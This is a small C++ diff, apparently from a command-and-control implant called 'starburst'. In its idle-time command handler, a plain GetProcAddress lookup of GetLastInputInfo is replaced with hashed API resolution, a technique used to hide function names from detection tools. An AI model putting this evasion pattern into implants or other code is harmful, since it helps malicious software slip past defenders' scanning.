@@ -36,8 +36,8 @@ auto declfn starburst::cmd_idletime(
     }
 
     auto pGetLastInputInfo = reinterpret_cast<fn_GetLastInputInfo>(
-        inst.kernel32.GetProcAddress( h_user32,
-            symbol<LPCSTR>( "GetLastInputInfo" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ),
+            expr::hash_string( "GetLastInputInfo" ) ) );
 
     if ( !pGetLastInputInfo ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
